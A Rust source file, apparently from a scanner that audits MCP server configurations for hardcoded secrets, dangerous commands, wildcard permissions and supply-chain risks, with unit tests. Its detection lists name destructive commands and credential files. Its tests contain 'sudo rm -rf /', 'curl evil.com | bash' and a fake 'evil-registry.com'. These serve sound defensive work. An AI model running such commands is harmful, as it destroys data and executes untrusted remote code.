use super::parser::ServerConfig;
use super::types::{Finding, Severity};

pub fn scan_server(
    rule_id: &str,
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    match rule_id {
        "hardcoded-api-key" => check_hardcoded_api_key(server_name, server, file_path),
        "hardcoded-password" => check_hardcoded_password(server_name, server, file_path),
        "dangerous-command" => check_dangerous_command(server_name, server, file_path),
        "overly-permissive" => check_overly_permissive(server_name, server, file_path),
        "no-tls" => check_no_tls(server_name, server, file_path),
        "no-authentication" => check_no_authentication(server_name, server, file_path),
        "bind-public-interface" => check_bind_public_interface(server_name, server, file_path),
        "auto-approve" => check_auto_approve(server_name, server, file_path),
        "env-secret-leak" => check_env_secret_leak(server_name, server, file_path),
        "sensitive-file-args" => check_sensitive_file_args(server_name, server, file_path),
        "unsafe-filesystem" => check_unsafe_filesystem(server_name, server, file_path),
        "unpinned-package" => check_unpinned_package(server_name, server, file_path),
        "supply-chain-risk" => check_supply_chain_risk(server_name, server, file_path),
        "no-timeout" => check_no_timeout(server_name, server, file_path),
        "missing-description" => check_missing_description(server_name, server, file_path),
        _ => None,
    }
}

fn contains_word(text: &str, pattern: &str) -> bool {
    if let Some(pos) = text.find(pattern) {
        let before = pos == 0 || {
            let c = text.as_bytes()[pos - 1];
            !c.is_ascii_alphanumeric() && c != b'_' && c != b'-'
        };
        let after = pos + pattern.len() >= text.len() || {
            let c = text.as_bytes()[pos + pattern.len()];
            !c.is_ascii_alphanumeric() && c != b'_' && c != b'-'
        };
        before && after
    } else {
        false
    }
}

fn build_command_text(server: &ServerConfig) -> String {
    let mut parts = Vec::new();
    if let Some(cmd) = server.get_command() {
        parts.push(cmd.to_string());
    }
    if let Some(ref args) = server.args {
        parts.extend(args.clone());
    }
    parts.join(" ")
}

// ── SC-01 ─────────────────────────────────────────────────────────

fn check_hardcoded_api_key(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    if let Some(key) = server.get_credential() {
        if !ServerConfig::is_env_var_ref(key) && !key.is_empty() && key.len() > 3 {
            return Some(make_finding(
                "hardcoded-api-key",
                server_name,
                file_path,
                Severity::Critical,
                "secrets",
                "Hardcoded API key in configuration",
                &mask_sensitive(key),
                "Replace with ${ENV_VAR} environment variable reference",
                true,
            ));
        }
    }

    if let Some(ref env) = server.env {
        for (var, val) in env {
            let looks_like_key = var.to_lowercase().contains("key")
                || var.to_lowercase().contains("token")
                || var.to_lowercase().contains("secret")
                || var.to_lowercase().contains("api");
            if looks_like_key && !ServerConfig::is_env_var_ref(val) && val.len() > 3 {
                return Some(make_finding(
                    "hardcoded-api-key",
                    server_name,
                    file_path,
                    Severity::Critical,
                    "secrets",
                    &format!("Environment variable {var} contains hardcoded value"),
                    &format!("{}={}", var, mask_sensitive(val)),
                    "Replace with ${ENV_VAR} environment variable reference",
                    true,
                ));
            }
        }
    }

    None
}

// ── SC-02 ─────────────────────────────────────────────────────────

fn check_hardcoded_password(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    if let Some(pwd) = server.get_password() {
        if !ServerConfig::is_env_var_ref(pwd) && !pwd.is_empty() {
            return Some(make_finding(
                "hardcoded-password",
                server_name,
                file_path,
                Severity::Critical,
                "secrets",
                "Hardcoded password in configuration",
                "****",
                "Replace with ${ENV_VAR} environment variable reference",
                true,
            ));
        }
    }
    None
}

// ── SC-03 ─────────────────────────────────────────────────────────

fn check_dangerous_command(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let all_text = build_command_text(server);
    if all_text.is_empty() {
        return None;
    }

    let lower = all_text.to_lowercase();

    let exact_patterns: &[&str] = &[
        "sudo",
        "rm -rf",
        "mkfs",
        "dd if=",
        ":(){ :|:& };:",
        "chmod 777",
        "chown -R",
        "> /etc/",
        ">> /etc/",
    ];

    for pattern in exact_patterns {
        if contains_word(&lower, pattern) {
            return Some(make_dangerous_finding(
                server_name,
                file_path,
                pattern,
                &all_text,
            ));
        }
    }

    let has_curl = lower.contains("curl");
    let has_wget = lower.contains("wget");
    let has_pipe = lower.contains("|");
    let has_shell = lower.contains("sh") || lower.contains("bash");

    if (has_curl || has_wget) && has_pipe && has_shell {
        return Some(make_dangerous_finding(
            server_name,
            file_path,
            "curl/wget piping to shell",
            &all_text,
        ));
    }

    None
}

// ── SC-04 ─────────────────────────────────────────────────────────

fn check_overly_permissive(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let tools_allow_all = server
        .allowed_tools
        .as_ref()
        .map(|tools| tools.iter().any(|t| t == "*"))
        .unwrap_or(false);

    let allow_all = server
        .allow
        .as_ref()
        .map(|a| a.iter().any(|x| x == "*"))
        .unwrap_or(false);

    if tools_allow_all || allow_all {
        return Some(make_finding(
            "overly-permissive",
            server_name,
            file_path,
            Severity::High,
            "permissions",
            "Overly permissive tool access — wildcard * used",
            "allowedTools: [\"*\"]",
            "Explicitly list required tools, follow least privilege principle",
            false,
        ));
    }

    let has_tools = server.allowed_tools.is_some() || server.allow.is_some();
    let is_tool_server = server.get_command().is_some() || server.has_url().is_some();

    if !has_tools && is_tool_server {
        return Some(make_finding(
            "overly-permissive",
            server_name,
            file_path,
            Severity::High,
            "permissions",
            "Overly permissive tool access — no tool restrictions configured",
            "No allowedTools/allow field specified, all tools are accessible",
            "Explicitly list required tools, follow least privilege principle",
            false,
        ));
    }

    None
}

// ── SC-05 ─────────────────────────────────────────────────────────

fn check_no_tls(server_name: &str, server: &ServerConfig, file_path: &str) -> Option<Finding> {
    if let Some(url) = server.has_url() {
        let lower = url.to_lowercase();
        if (lower.starts_with("http://") || lower.starts_with("ws://")) && !is_localhost_url(&lower)
        {
            return Some(make_finding(
                "no-tls",
                server_name,
                file_path,
                Severity::Medium,
                "network",
                "Server uses insecure connection",
                &format!("url: {url}"),
                "Change URL to https:// to enable TLS encryption",
                true,
            ));
        }
    }
    None
}

fn is_localhost_url(url: &str) -> bool {
    url.contains("://localhost") || url.contains("://127.0.0.1") || url.contains("://[::1]")
}

// ── SC-06 ─────────────────────────────────────────────────────────

fn check_no_authentication(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let has_credential = server
        .get_credential()
        .is_some_and(|c| !c.is_empty() && c != "${}" && !c.trim().is_empty());
    let has_auth_header = server.auth.is_some() || server.authorization.is_some();
    let has_env_token = server
        .env
        .as_ref()
        .map(|env| {
            env.keys().any(|k| {
                let lower = k.to_lowercase();
                lower.contains("token")
                    || lower.contains("api_key")
                    || lower.contains("apikey")
                    || lower.contains("secret")
                    || lower.contains("auth")
            })
        })
        .unwrap_or(false);

    let has_url = server.has_url().is_some();

    if has_url && !has_credential && !has_auth_header && !has_env_token {
        return Some(make_finding(
            "no-authentication",
            server_name,
            file_path,
            Severity::High,
            "authentication",
            "Remote server lacks authentication configuration",
            "No apiKey/token/auth/Authorization header detected",
            "Add apiKey or Authorization header for authentication",
            false,
        ));
    }
    None
}

// ── SC-07 ─────────────────────────────────────────────────────────

fn check_bind_public_interface(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let host = server.host.as_deref().or(server.bind.as_deref());
    if let Some(h) = host {
        let h = h.trim();
        let addr = if h.starts_with('[') {
            h.to_string()
        } else {
            h.split(':').next().unwrap_or(h).to_string()
        };
        if addr == "0.0.0.0" || addr == "::" {
            return Some(make_finding(
                "bind-public-interface",
                server_name,
                file_path,
                Severity::High,
                "network",
                "Server bound to all network interfaces (0.0.0.0)",
                &format!("host: {h}"),
                "Restrict binding to 127.0.0.1 or specific internal IP",
                false,
            ));
        }
    }
    None
}

// ── SC-08 ─────────────────────────────────────────────────────────

fn check_auto_approve(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let auto_approve_all = server
        .auto_approve
        .as_ref()
        .map(|aa| aa.iter().any(|x| x == "*"))
        .unwrap_or(false);

    if auto_approve_all {
        return Some(make_finding(
            "auto-approve",
            server_name,
            file_path,
            Severity::High,
            "permissions",
            "Auto-approve with wildcard * — all tool calls bypass user confirmation",
            "autoApprove: [\"*\"]",
            "Remove * wildcard from autoApprove",
            false,
        ));
    }
    None
}

// ── SC-11 ─────────────────────────────────────────────────────────

fn check_env_secret_leak(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    if let Some(ref env) = server.env {
        for (var, val) in env {
            if ServerConfig::is_env_var_ref(val) || val.is_empty() {
                continue;
            }
            if looks_like_secret_value(val) {
                return Some(make_finding(
                    "env-secret-leak",
                    server_name,
                    file_path,
                    Severity::High,
                    "secrets",
                    &format!("Environment variable {var} value appears to be a secret"),
                    &format!("{}={}", var, mask_sensitive(val)),
                    "Replace hardcoded value with ${VAR} environment variable reference",
                    true,
                ));
            }
        }
    }
    None
}

fn looks_like_secret_value(val: &str) -> bool {
    let val = val.trim();
    if val.len() < 8 {
        return false;
    }
    let known_prefixes = [
        "sk-",
        "sk_",
        "ghp_",
        "gho_",
        "ghu_",
        "ghs_",
        "ghr_",
        "xoxb-",
        "xoxp-",
        "xapp-",
        "eyJ",
        "AKIA",
        "ABIA",
        "ACCA",
        "-----BEGIN",
        "-----END",
    ];
    for prefix in &known_prefixes {
        if val.starts_with(prefix) {
            return true;
        }
    }
    let has_digits = val.chars().any(|c| c.is_ascii_digit());
    let has_upper = val.chars().any(|c| c.is_ascii_uppercase());
    let has_lower = val.chars().any(|c| c.is_ascii_lowercase());
    let has_special = val.chars().any(|c| !c.is_ascii_alphanumeric());
    if val.len() >= 20 && has_digits && has_upper && has_lower && has_special {
        return true;
    }
    if val.len() >= 32 {
        let alphanumeric = val.chars().all(|c| c.is_ascii_alphanumeric());
        if alphanumeric && (has_digits || has_upper) {
            return true;
        }
    }
    false
}

// ── SC-12 ─────────────────────────────────────────────────────────

fn check_sensitive_file_args(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let sensitive_patterns = [
        ".env",
        "credentials",
        ".pem",
        ".key",
        ".crt",
        ".cer",
        "id_rsa",
        "id_ed25519",
        "id_ecdsa",
        "authorized_keys",
        ".htpasswd",
        "shadow",
        "master.key",
        "secrets.yml",
    ];

    let args: Vec<&str> = server
        .args
        .as_ref()
        .map(|a| a.iter().map(String::as_str).collect())
        .unwrap_or_default();

    for arg in &args {
        let lower = arg.to_lowercase();
        for pattern in &sensitive_patterns {
            if lower.contains(pattern) {
                return Some(make_finding(
                    "sensitive-file-args",
                    server_name,
                    file_path,
                    Severity::Medium,
                    "secrets",
                    &format!("Sensitive file referenced in startup arguments: {pattern}"),
                    arg,
                    "Avoid passing sensitive files as startup arguments; use environment variables instead",
                    false,
                ));
            }
        }
    }

    if let Some(cmd) = server.get_command() {
        let lower = cmd.to_lowercase();
        for pattern in &sensitive_patterns {
            if lower.contains(pattern) {
                return Some(make_finding(
                    "sensitive-file-args",
                    server_name,
                    file_path,
                    Severity::Medium,
                    "secrets",
                    &format!("Sensitive file referenced in command: {pattern}"),
                    cmd,
                    "Avoid passing sensitive files in command; use environment variables instead",
                    false,
                ));
            }
        }
    }

    None
}

// ── SC-14 ─────────────────────────────────────────────────────────

fn check_unsafe_filesystem(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let args: Vec<&str> = server
        .args
        .as_ref()
        .map(|a| a.iter().map(String::as_str).collect())
        .unwrap_or_default();

    for arg in &args {
        let trimmed = arg.trim();
        if trimmed == "/" || trimmed == "~" || trimmed == "C:\\" {
            return Some(make_finding(
                "unsafe-filesystem",
                server_name,
                file_path,
                Severity::High,
                "permissions",
                "Filesystem server allows access to root directory",
                &format!("args contains: {arg}"),
                "Restrict filesystem access to specific directories only",
                false,
            ));
        }
        if trimmed.starts_with("/root")
            || trimmed.starts_with("/etc")
            || trimmed.starts_with("/home/")
        {
            let is_fs_server = server
                .get_command()
                .map(|c| {
                    let c = c.to_lowercase();
                    c.contains("filesystem")
                        || c.contains("fs")
                        || c.contains("npx")
                        || c.contains("uvx")
                })
                .unwrap_or(true);
            if is_fs_server {
                return Some(make_finding(
                    "unsafe-filesystem",
                    server_name,
                    file_path,
                    Severity::High,
                    "permissions",
                    &format!("Filesystem server may have overly broad access: {arg}"),
                    arg,
                    "Restrict filesystem access to application-specific directories",
                    false,
                ));
            }
        }
    }

    None
}

#[allow(clippy::too_many_arguments)]
fn make_finding(
    rule_id: &str,
    server_name: &str,
    file_path: &str,
    severity: Severity,
    category: &str,
    title: &str,
    evidence: &str,
    recommendation: &str,
    auto_fixable: bool,
) -> Finding {
    Finding::builder()
        .rule_id(rule_id)
        .server_name(server_name)
        .file(file_path)
        .severity(severity)
        .category(category)
        .title(title)
        .evidence(evidence)
        .recommendation(recommendation)
        .auto_fixable(auto_fixable)
        .build()
}

// ── SC-10 ─────────────────────────────────────────────────────────

fn check_unpinned_package(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let cmd = server.get_command().unwrap_or("").to_string();
    let args: Vec<String> = server
        .args
        .as_ref()
        .map(|a| a.iter().map(|s| s.trim().to_string()).collect())
        .unwrap_or_default();

    let is_runtime_installer = cmd.contains("npx")
        || cmd.contains("uvx")
        || (cmd.contains("pnpm") && args.iter().any(|a| a == "dlx"))
        || (cmd.contains("npm") && args.iter().any(|a| a == "exec"));

    if !is_runtime_installer {
        return None;
    }

    let mut has_package = false;
    let mut has_version = false;

    for arg in &args {
        let arg = arg.trim();
        if arg == "-y"
            || arg == "--yes"
            || arg == "exec"
            || arg == "dlx"
            || arg == "--"
            || arg.starts_with("--")
        {
            continue;
        }
        if arg.is_empty() {
            continue;
        }
        has_package = true;
        has_version = arg.contains('@') || arg.contains('#');
        break;
    }

    if has_package && !has_version {
        Some(Finding::builder()
            .rule_id("unpinned-package")
            .server_name(server_name)
            .file(file_path)
            .severity(Severity::Medium)
            .category("secrets")
            .title("Package version not pinned — supply chain risk")
            .evidence(&format!("Command: {} {}", cmd, args.join(" ")))
            .recommendation("Pin package to a specific version (e.g. @1.2.3) to prevent supply chain attacks")
            .build())
    } else {
        None
    }
}

// ── SC-15 ─────────────────────────────────────────────────────────

fn check_supply_chain_risk(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    let all_args: Vec<&str> = server
        .args
        .as_ref()
        .map(|a| a.iter().map(String::as_str).collect())
        .unwrap_or_default();

    for pair in all_args.windows(2) {
        if pair[0] == "--registry" || pair[0] == "-r" {
            let registry = pair[1];
            let lower = registry.to_lowercase();
            let is_official = lower.contains("registry.npmjs.org")
                || lower.contains("registry.yarnpkg.com")
                || lower.contains("pypi.org")
                || lower.contains("crates.io");
            if !is_official {
                return Some(Finding::builder()
                    .rule_id("supply-chain-risk")
                    .server_name(server_name)
                    .file(file_path)
                    .severity(Severity::Medium)
                    .category("secrets")
                    .title("Non-official package registry detected — supply chain risk")
                    .evidence(&format!("--registry {registry}"))
                    .recommendation("Use official registries (registry.npmjs.org / pypi.org) or verify the source")
                    .build());
            }
        }
    }

    None
}

// ── SC-09 ─────────────────────────────────────────────────────────

fn check_no_timeout(server_name: &str, server: &ServerConfig, file_path: &str) -> Option<Finding> {
    if server.has_url().is_some() && server.timeout.is_none() {
        Some(
            Finding::builder()
                .rule_id("no-timeout")
                .server_name(server_name)
                .file(file_path)
                .severity(Severity::Low)
                .category("network")
                .title("No timeout configured for remote server")
                .evidence("No timeout field found in server configuration")
                .recommendation("Add a timeout field (seconds) to prevent hanging connections")
                .build(),
        )
    } else {
        None
    }
}

// ── SC-13 ─────────────────────────────────────────────────────────

fn check_missing_description(
    server_name: &str,
    server: &ServerConfig,
    file_path: &str,
) -> Option<Finding> {
    if server
        .description
        .as_ref()
        .is_none_or(|d| d.trim().is_empty())
    {
        Some(
            Finding::builder()
                .rule_id("missing-description")
                .server_name(server_name)
                .file(file_path)
                .severity(Severity::Info)
                .category("best-practice")
                .title("Server is missing a description")
                .evidence("No description field found in server configuration")
                .recommendation("Add a description field to document the server's purpose")
                .build(),
        )
    } else {
        None
    }
}

// ── helpers ───────────────────────────────────────────────────────

fn mask_sensitive(value: &str) -> String {
    if value.len() <= 4 {
        return "***".to_string();
    }
    format!("{}...{}", &value[..2], &value[value.len() - 4..])
}

fn make_dangerous_finding(
    server_name: &str,
    file_path: &str,
    pattern: &str,
    all_text: &str,
) -> Finding {
    Finding::builder()
        .rule_id("dangerous-command")
        .server_name(server_name)
        .file(file_path)
        .severity(Severity::High)
        .category("permissions")
        .title(&format!("Dangerous command pattern detected: {pattern}"))
        .evidence(&safe_truncate(all_text, 120))
        .recommendation("Remove dangerous command patterns, apply least privilege principle")
        .build()
}

pub fn safe_truncate(text: &str, max_len: usize) -> String {
    if text.len() <= max_len {
        return text.to_string();
    }
    let mut end = max_len;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}...", &text[..end])
}

#[cfg(test)]
mod tests {
    use super::super::parser::ServerConfig;
    use super::*;
    use std::collections::HashMap;

    fn make_server() -> ServerConfig {
        ServerConfig {
            command: None,
            args: None,
            cmd: None,
            run: None,
            exec: None,
            env: None,
            api_key: None,
            token: None,
            access_token: None,
            secret: None,
            password: None,
            passwd: None,
            pwd: None,
            url: None,
            host: None,
            bind: None,
            auto_approve: None,
            allowed_tools: None,
            allow: None,
            auth: None,
            authorization: None,
            timeout: None,
            description: None,
            transport: None,
            tools: None,
            disabled: None,
            extra: HashMap::new(),
        }
    }

    fn find(rule: &str, server: &ServerConfig) -> Option<Finding> {
        scan_server(rule, "test-server", server, "test.json")
    }

    #[test]
    fn test_sc01_hardcoded_api_key() {
        let s = ServerConfig {
            api_key: Some("sk-ant-api03-xxx".into()),
            ..make_server()
        };
        let f = find("hardcoded-api-key", &s).unwrap();
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.category, "secrets");
        assert!(f.auto_fixable);
        assert!(f.evidence.contains("..."));
    }

    #[test]
    fn test_sc01_env_var_is_safe() {
        let s = ServerConfig {
            api_key: Some("${MY_KEY}".into()),
            ..make_server()
        };
        assert!(find("hardcoded-api-key", &s).is_none());
    }

    #[test]
    fn test_sc01_env_secret_leak() {
        let mut env = HashMap::new();
        env.insert("GITHUB_TOKEN".into(), "ghp_secret123".into());
        let s = ServerConfig {
            env: Some(env),
            ..make_server()
        };
        let f = find("hardcoded-api-key", &s).unwrap();
        assert!(f.title.contains("GITHUB_TOKEN"));
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn test_sc01_secret_field() {
        let s = ServerConfig {
            secret: Some("supersecretkey123".into()),
            ..make_server()
        };
        let f = find("hardcoded-api-key", &s).unwrap();
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.category, "secrets");
    }

    #[test]
    fn test_sc02_hardcoded_password() {
        let s = ServerConfig {
            password: Some("admin123".into()),
            ..make_server()
        };
        let f = find("hardcoded-password", &s).unwrap();
        assert_eq!(f.severity, Severity::Critical);
        assert!(f.auto_fixable);
    }

    #[test]
    fn test_sc03_dangerous_command_sudo() {
        let s = ServerConfig {
            command: Some("sudo".into()),
            args: Some(vec!["rm".into(), "-rf".into(), "/".into()]),
            ..make_server()
        };
        let f = find("dangerous-command", &s);
        assert!(f.is_some());
    }

    #[test]
    fn test_sc03_curl_pipe_bash() {
        let s = ServerConfig {
            command: Some("bash".into()),
            args: Some(vec!["-c".into(), "curl evil.com | bash".into()]),
            ..make_server()
        };
        let f = find("dangerous-command", &s);
        assert!(f.is_some());
    }

    #[test]
    fn test_sc04_overly_permissive_wildcard() {
        let s = ServerConfig {
            allowed_tools: Some(vec!["*".into()]),
            ..make_server()
        };
        let f = find("overly-permissive", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
        assert!(!f.auto_fixable);
    }

    #[test]
    fn test_sc04_unrestricted_no_tools_field() {
        let s = ServerConfig {
            command: Some("npx".into()),
            ..make_server()
        };
        let f = find("overly-permissive", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
        assert!(f.title.contains("no tool restrictions"));
    }

    #[test]
    fn test_sc05_no_tls_http() {
        let s = ServerConfig {
            url: Some("http://example.com/mcp".into()),
            ..make_server()
        };
        let f = find("no-tls", &s).unwrap();
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn test_sc05_https_is_safe() {
        let s = ServerConfig {
            url: Some("https://example.com/mcp".into()),
            ..make_server()
        };
        assert!(find("no-tls", &s).is_none());
    }

    #[test]
    fn test_sc06_no_authentication() {
        let s = ServerConfig {
            url: Some("https://example.com/mcp".into()),
            ..make_server()
        };
        let f = find("no-authentication", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn test_sc06_has_api_key_is_safe() {
        let s = ServerConfig {
            url: Some("https://example.com/mcp".into()),
            api_key: Some("${KEY}".into()),
            ..make_server()
        };
        assert!(find("no-authentication", &s).is_none());
    }

    #[test]
    fn test_sc07_bind_public() {
        let s = ServerConfig {
            host: Some("0.0.0.0".into()),
            ..make_server()
        };
        let f = find("bind-public-interface", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn test_sc08_auto_approve_wildcard() {
        let s = ServerConfig {
            auto_approve: Some(vec!["*".into()]),
            ..make_server()
        };
        let f = find("auto-approve", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn test_sc11_env_secret_leak() {
        let mut env = HashMap::new();
        env.insert("NODE_OPTIONS".into(), "sk-ant-api03-xxxxyyyyzzzz".into());
        let s = ServerConfig {
            env: Some(env),
            ..make_server()
        };
        let f = find("env-secret-leak", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
        assert!(f.auto_fixable);
    }

    #[test]
    fn test_sc11_env_var_is_safe() {
        let mut env = HashMap::new();
        env.insert("MY_VAR".into(), "${MY_VAR}".into());
        let s = ServerConfig {
            env: Some(env),
            ..make_server()
        };
        assert!(find("env-secret-leak", &s).is_none());
    }

    #[test]
    fn test_sc11_empty_env_is_safe() {
        let s = make_server();
        assert!(find("env-secret-leak", &s).is_none());
    }

    #[test]
    fn test_sc12_sensitive_file_args() {
        let s = ServerConfig {
            command: Some("npx".into()),
            args: Some(vec![
                "-y".into(),
                "@modelcontextprotocol/server-filesystem".into(),
                "/path/to/.env".into(),
            ]),
            ..make_server()
        };
        let f = find("sensitive-file-args", &s).unwrap();
        assert_eq!(f.severity, Severity::Medium);
        assert!(f.evidence.contains(".env"));
    }

    #[test]
    fn test_sc12_pem_file() {
        let s = ServerConfig {
            command: Some("node".into()),
            args: Some(vec![
                "server.js".into(),
                "--key".into(),
                "private.pem".into(),
            ]),
            ..make_server()
        };
        let f = find("sensitive-file-args", &s).unwrap();
        assert!(f.evidence.contains(".pem"));
    }

    #[test]
    fn test_sc12_no_args_is_safe() {
        let s = ServerConfig {
            command: Some("npx".into()),
            args: Some(vec!["-y".into(), "safe-package".into()]),
            ..make_server()
        };
        assert!(find("sensitive-file-args", &s).is_none());
    }

    #[test]
    fn test_sc14_unsafe_filesystem_root() {
        let s = ServerConfig {
            command: Some("npx".into()),
            args: Some(vec![
                "-y".into(),
                "@modelcontextprotocol/server-filesystem".into(),
                "/".into(),
            ]),
            ..make_server()
        };
        let f = find("unsafe-filesystem", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn test_sc14_unsafe_filesystem_home() {
        let s = ServerConfig {
            command: Some("npx".into()),
            args: Some(vec![
                "-y".into(),
                "@modelcontextprotocol/server-filesystem".into(),
                "~".into(),
            ]),
            ..make_server()
        };
        let f = find("unsafe-filesystem", &s).unwrap();
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn test_sc14_restricted_path_is_safe() {
        let s = ServerConfig {
            command: Some("npx".into()),
            args: Some(vec![
                "-y".into(),
                "@modelcontextprotocol/server-filesystem".into(),
                "/project/data".into(),
            ]),
            ..make_server()
        };
        assert!(find("unsafe-filesystem", &s).is_none());
    }

    #[test]
    fn test_sc10_unpinned_npx() {
        let s = ServerConfig {
            command: Some("npx".into()),
            args: Some(vec!["-y".into(), "some-package".into()]),
            ..make_server()
        };
        let f = find("unpinned-package", &s).unwrap();
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn test_sc10_pinned_version() {
        let s = ServerConfig {
            command: Some("npx".into()),
            args: Some(vec!["-y".into(), "package@1.2.3".into()]),
            ..make_server()
        };
        assert!(find("unpinned-package", &s).is_none());
    }

    #[test]
    fn test_sc10_not_runtime_installer() {
        let s = ServerConfig {
            command: Some("node".into()),
            args: Some(vec!["server.js".into()]),
            ..make_server()
        };
        assert!(find("unpinned-package", &s).is_none());
    }

    #[test]
    fn test_sc15_non_official_registry() {
        let s = ServerConfig {
            command: Some("npm".into()),
            args: Some(vec![
                "install".into(),
                "--registry".into(),
                "https://evil-registry.com".into(),
            ]),
            ..make_server()
        };
        let f = find("supply-chain-risk", &s).unwrap();
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn test_sc15_official_registry() {
        let s = ServerConfig {
            command: Some("npm".into()),
            args: Some(vec![
                "install".into(),
                "--registry".into(),
                "https://registry.npmjs.org".into(),
            ]),
            ..make_server()
        };
        assert!(find("supply-chain-risk", &s).is_none());
    }
}
